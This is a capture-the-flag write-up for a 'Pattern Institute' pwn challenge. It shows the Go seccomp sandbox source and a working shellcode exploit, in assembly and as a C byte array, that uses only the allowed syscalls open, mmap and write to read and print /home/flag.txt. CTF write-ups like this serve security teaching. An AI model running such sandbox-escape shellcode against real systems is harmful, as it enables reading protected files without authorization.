# Pattern Institute
* Category: Pwn
* 450 Points
* Solved by the JCTF Team

## Description

> It is you against the Pattern Institute!
> 
> However, Pattern Institute know what they're up against, so they shut down all their systems, except a sandboxed one, in which they allow only limited operations for their operatives to run.
> 
> Our researchers were able to gain hold of the sandbox source code and chain some cool vulnerabilities in Pattern Institute's sandbox, to eventualy get an arbitrary binary to run on that system! but it's been a long time since they've played in the sand.
> 
> Your job is to steal an important file from their system's /home folder and report its contents back to headquarters.

A `*.go` file was attached.

```go
package main

import (
    "os"
    "fmt"
    "syscall"
    b64 "encoding/base64"
    libseccomp "github.com/seccomp/libseccomp-golang"
)


func whiteList(syscalls []string) {

    fmt.Printf("|------------------------------------------|\n")
    fmt.Printf("\033[0;33m[!] Sandboxing all syscalls\033[0m\n")

    filter, err := libseccomp.NewFilter(libseccomp.ActErrno.SetReturnCode(int16(syscall.EPERM)))
    if err != nil {
        fmt.Printf("Error creating filter: %s\n", err)
    }
    for _, element := range syscalls {
        fmt.Printf("[+] Whitelisting: %s\n", element /*"*****"*/)
        syscallID, err := libseccomp.GetSyscallFromName(element)
        if err != nil {
            panic(err)
        }
        filter.AddRule(syscallID, libseccomp.ActAllow)
    }
    filter.Load()
    fmt.Printf("\n|------------------------------------------|\n")
}

func main() {

    /* get parameter from command line and decode to base64, then write it to disk */
    if len(os.Args) != 2 {
       fmt.Printf( "[!] ERROR, argument missing\n\033[1;31mUse 'http://ip:port/?arg=<base64 encoded code>' to run your code inside the sandbox\033[0m\n\n")
       return
    }

    sDec, _ := b64.StdEncoding.DecodeString(os.Args[1])

    file, err := os.Create("/tmp/your_code")
    if err != nil {
	panic(err)
    }
    _, errW := file.Write(sDec)
    if errW != nil {
	panic(errW)
    }

    // Change permissions Linux.
    err = os.Chmod("/tmp/your_code", 0777)
    if err != nil {
	panic(err)
    }
    file.Close()

    //===== S A N D B O X     S T A R T S =====
    var syscalls = []string{
    "mmap", "mprotect", "write", "open", "close", "fstat",
    "execve", "arch_prctl", "stat", "futex", "exit_group" }

    whiteList(syscalls)

    fmt.Printf( "\n[+] Now decoding your code...\n")
    fmt.Printf( "[+] Running your code...\n\n\033[1;33mSTDOUT:\n=======\033[0m\n")

    err2 := syscall.Exec("/tmp/your_code", nil, nil)
    if err2 != nil {
        fmt.Printf( "[-] Error encountered while running your code!\n%s\n", err2)
    }

    fmt.Printf("\n\n\033[1;32m|-------------END OF EXECUTION---------------|\033[0m\n")

    // infinite loop
    for {
    }
}
```

## Solution

We can see that the program accepts our input (a base64 encoded program), writes it to `/tmp` and runs it under seccomp restrictions. Since we need to leak the flag, we need to find a way to open a file, read its content and write it to `stdout` by only using the whitelisted syscalls: `["mmap", "mprotect", "write", "open", "close", "fstat", "execve", "arch_prctl", "stat", "futex", "exit_group"]`.

We can find a collection of templates to bypass seccomp [here](https://github.com/unixist/seccomp-bypass). `read-with-mmap` seems like exactly what we need:

```assembly
.globl _start
_start:
        // open
	movw $0x7374, %r11w             /* ts */
	push %r11
	movq $0x736f682f6374652f, %r11  /* /etc/hos */
	push %r11
	lea 0(%rsp), %rdi
	xor %rsi, %rsi
	addb $2, %al
	syscall

	// mmap
	xor %rdi, %rdi
	xor %rsi, %rsi
	mov $0xffff, %si
	xor %rdx, %rdx
	add $1, %dl
	mov %rax, %r8
	xor %r9, %r9
	xor %r10, %r10
	add $1, %r10b
	xor %rax, %rax
	mov $9, %al
	syscall

	// write
	xor %rdi, %rdi
	inc %dl
	mov %rax, %rsi
	xor %rdx, %rdx
	mov $0xffff, %dx
	xor %rax, %rax
	inc %al
	syscall

	// exit
	xor %rdi, %rdi
	mov $3, %dl
	xor %rax, %rax
	mov $60, %al
	syscall
```

This snippet just uses `open`, `mmap`, `write` and `exit` to leak the contents of `/etc/hosts`. All the syscalls are allowed in our case, so we just need to change the target file and compile.

At first we might be tempted to just change the filename from `/etc/hosts` to `/home/flag.txt` and compile the program:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Pattern_Institute]
└─$ diff read-with-mmap.s solve.s
4c4
<       movw $0x7374, %r11w             /* ts */
---
>       mov $0x7478742e6761, %r11             /* ag.txt */
6c6
<       movq $0x736f682f6374652f, %r11  /* /etc/hos */
---
>       movq $0x6c662f656d6f682f, %r11  /* /home/fl */
42a43
>

┌──(user@kali)-[/media/sf_CTFs/intent/Pattern_Institute]
└─$ f="solve"; ./gen-shellcode.sh solve.s > $f.c; gcc -static $f.c -o $f
```

However, the build instructions in the repository create the following source code:

```c
#include <stdint.h>
#include <sys/mman.h>

char shellcode[] = "\x49\xbb\x61\x67\x2e\x74\x78\x74\x00\x00\x41\x53\x49\xbb\x2f"
                   "\x68\x6f\x6d\x65\x2f\x66\x6c\x41\x53\x48\x8d\x3c\x24\x48\x31"
                   "\xf6\x04\x02\x0f\x05\x48\x31\xff\x48\x31\xf6\x66\xbe\xff\xff"
                   "\x48\x31\xd2\x80\xc2\x01\x49\x89\xc0\x4d\x31\xc9\x4d\x31\xd2"
                   "\x41\x80\xc2\x01\x48\x31\xc0\xb0\x09\x0f\x05\x48\x31\xff\xfe"
                   "\xc2\x48\x89\xc6\x48\x31\xd2\x66\xba\xff\xff\x48\x31\xc0\xfe"
                   "\xc0\x0f\x05\x48\x31\xff\xb2\x03\x48\x31\xc0\xb0\x3c\x0f\x05";

int main(){
  mprotect((void *)((uint64_t)shellcode & ~4095), 4096, PROT_READ|PROT_EXEC);
  (*(void(*)()) shellcode)();
  return 0;
}

```

When compiled with GCC, this creates a program which uses extra syscalls such as `brk`, as seen when running `strace`:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Pattern_Institute]
└─$ strace ./solve
execve("./solve", ["./solve"], 0x7ffe49f0d970 /* 32 vars */) = 0
brk(NULL)                               = 0xf65000
brk(0xf65d80)                           = 0xf65d80
arch_prctl(ARCH_SET_FS, 0xf65380)       = 0
uname({sysname="Linux", nodename="kali", ...}) = 0
readlink("/proc/self/exe", "/media/sf_CTFs/intent/Pattern_In"..., 4096) = 45
brk(0xf86d80)                           = 0xf86d80
brk(0xf87000)                           = 0xf87000
mprotect(0x4a9000, 12288, PROT_READ)    = 0
mprotect(0x4ac000, 4096, PROT_READ|PROT_EXEC) = 0
open("/home/flag.txt", O_RDONLY)        = -1 ENOENT (No such file or directory)
mmap(NULL, 65535, PROT_READ, MAP_SHARED, -2, 0) = -1 EBADF (Bad file descriptor)
write(0, 0xfffffffffffffff7, 65535)     = -1 EFAULT (Bad address)
exit(0)                                 = ?
+++ exited with 0 +++
```

To get a minimal executable, we should use a tool such as `nasm`. This requires us to port the assembly syntax to Intel syntax:

```assembly
    
    global    _start
    section   .text
	
_start:  
    
    xor rax, rax ; Added since al is used below without initialization
    
    ; open
	mov  r11, 0x7478742e6761       ; ag.txt
	push r11
	mov  r11, 0x6c662f656d6f682f   ; /home/fl
	push r11
	lea  rdi, [rsp + 0]
	xor  rsi, rsi
	add al, 2
	syscall

	; mmap
	xor rdi, rdi
	xor rsi, rsi
	mov si, 0xffff
	xor rdx, rdx
	add dl, 1
	mov r8, rax
	xor r9, r9
	xor r10, r10
	add r10b, 1
	xor rax, rax
	mov al, 9
	syscall

	; write
	xor rdi, rdi
	inc dl
	mov rsi, rax 
	xor rdx, rdx
	mov dx, 0xffff
	xor rax, rax
	inc al
	syscall

	; exit
	xor rdi, rdi
	mov dl, 3
	xor rax, rax
	mov al, 60
	syscall

```

Let's compile:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Pattern_Institute]
└─$ nasm -felf64 solve.asm && ld solve.o -o ./solve
```

We can check the syscalls with `strace`:
```console
┌──(user@kali)-[/media/sf_CTFs/intent/Pattern_Institute]
└─$ strace ./solve
execve("./solve", ["./solve"], 0x7ffc45a3aac0 /* 32 vars */) = 0
open("/home/flag.txt", O_RDONLY)        = -1 ENOENT (No such file or directory)
mmap(NULL, 65535, PROT_READ, MAP_SHARED, -2, 0) = -1 EBADF (Bad file descriptor)
write(0, 0xfffffffffffffff7, 65535)     = -1 EFAULT (Bad address)
exit(0)                                 = ?
+++ exited with 0 +++
```

Now we just base64-encode the program and submit it:

```
successfully wrote to file...

Welcome to Alpine Linux 3.8
Kernel 4.14.55-84.37.amzn2.x86_64 on an x86_64 (ttyS0)

localhost login: root (automatic login)

Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

[*] FC  IP=172.16.0.50
[*] TAP IP=172.16.0.49
______     _   _                    _____          _   _ _         _
| ___ \   | | | |                  |_   _|        | | (_) |       | |
| |_/ /_ _| |_| |_ ___ _ __ _ __     | | _ __  ___| |_ _| |_ _   _| |_ ___
|  __/ _` | __| __/ _ \ '__| '_ \    | || '_ \/ __| __| | __| | | | __/ _ \
| | | (_| | |_| ||  __/ |  | | | |  _| || | | \__ \ |_| | |_| |_| | ||  __/
\_|  \__,_|\__|\__\___|_|  |_| |_|  \___/_| |_|___/\__|_|\__|\__,_|\__\___|

Welcome dear visitor!

|------------------------------------------|
[!] Sandboxing all syscalls
[+] Whitelisting: mmap
[+] Whitelisting: mprotect
[+] Whitelisting: write
[+] Whitelisting: open
[+] Whitelisting: close
[+] Whitelisting: fstat
[+] Whitelisting: execve
[+] Whitelisting: arch_prctl
[+] Whitelisting: stat
[+] Whitelisting: futex
[+] Whitelisting: exit_group

|------------------------------------------|

[+] Now decoding your code...
[+] Running your code...

STDOUT:
=======
INTENT{pl4y1n6_1n_7h3_54nd_15_d4n63r0u5}
Segmentation fault
```